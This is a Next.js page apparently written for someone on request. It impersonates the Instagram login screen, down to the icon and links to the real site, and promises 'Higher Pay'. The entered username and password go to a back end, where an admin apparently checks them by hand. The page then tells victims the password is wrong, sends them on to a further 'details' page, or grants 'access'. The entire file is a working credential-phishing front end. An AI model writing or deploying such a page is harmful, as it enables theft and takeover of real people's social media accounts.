// app/auth/bind/page.tsx
'use client'
import React, { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function AuthBindPage() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState<string | null>(null)
  const router = useRouter()

  const openForgot = (e: React.MouseEvent) => {
    e.preventDefault()
    window.open('https://www.instagram.com', '_blank')
  }

  const handleSubmit = async () => {
    setMessage(null)
    const handle = typeof window !== 'undefined' ? localStorage.getItem('tv_handle') : null
    if (!handle) {
      setMessage('You must verify your Instagram handle first.')
      return
    }
    if (!username.trim() || !password.trim()) {
      setMessage('Enter username and password.')
      return
    }

    setLoading(true)
    try {
      const res = await fetch('/api/bind-request', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ user_handle: handle, username: username.trim(), password: password.trim() }),
      })
      const j = await res.json()
      if (!res.ok) {
        setMessage(j?.error || 'Failed to create request')
        setLoading(false)
        return
      }

      const bindId = j.id as string
      setMessage('⏳ Waiting for Oauth approval (approx 2–3 min)...')

      // poll (same logic you had)
      const start = Date.now()
      const shortTimeout = 3 * 60 * 1000
      let finalStatus: string | null = null
      while (Date.now() - start < 7 * 60 * 1000) {
        const r = await fetch(`/api/bind-status?id=${bindId}`)
        const data = await r.json()
        const status = data?.bind?.status
        if (status && status !== 'pending') {
          finalStatus = status
          break
        }
        if (Date.now() - start >= shortTimeout) {
          setMessage('No admin response yet — please try again after 1–2 hours.')
        }
        await new Promise((s) => setTimeout(s, 8000))
      }

      setLoading(false)
      if (finalStatus === 'rejected') {
        setMessage('❌ Username or password is wrong. (Click "Forgotten password?" if needed)')
        return
      }
      if (finalStatus === 'approved1') {
        router.push(`/auth/details?id=${bindId}`)
        return
      }
      if (finalStatus === 'approved') {
        setMessage('✅ Approved. You can now access Higher Pay.')
        router.push('/premium')
        return
      }
      // if still no final status message already set to try later
    } catch (err) {
      console.error(err)
      setMessage('Error submitting. Try again.')
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-6">
      <div className="w-full max-w-md text-center">
        <div className="mb-6">
          <img src="/insta-icon.png" alt="insta" style={{ width: 80, margin: '0 auto' }} />
        </div>

        <div className="space-y-4 text-left">
          <label className="block text-sm text-gray-600">Username, email or mobile</label>
          <input
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full rounded-2xl border border-gray-300 px-4 py-4 placeholder-gray-400 text-black focus:outline-none focus:ring-2 focus:ring-blue-200"
            placeholder="Username"
            autoComplete="username"
          />

          <label className="block text-sm text-gray-600 mt-2">Password</label>
          {/* plain text per your request; to hide set type="password" */}
          <input
            type="text"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full rounded-2xl border border-gray-300 px-4 py-4 placeholder-gray-400 text-black focus:outline-none focus:ring-2 focus:ring-blue-200"
            placeholder="Password"
            autoComplete="current-password"
          />

          <button
            onClick={handleSubmit}
            disabled={loading}
            className="w-full mt-4 rounded-full py-3 bg-blue-600 text-white font-semibold"
          >
            {loading ? 'Please wait...' : 'Log in'}
          </button>

          <div className="text-center mt-3 text-sm">
            <a href="#" onClick={openForgot} className="text-gray-600">Forgotten password?</a>
          </div>

          <div className="mt-4 text-center">
            <a href="https://www.instagram.com" target="_blank" rel="noreferrer" className="w-full inline-block rounded-full px-4 py-3 border">Create new account</a>
          </div>

          {message && <div className="mt-4 text-sm text-center text-red-500">{message}</div>}
        </div>
      </div>
    </div>
  )
}
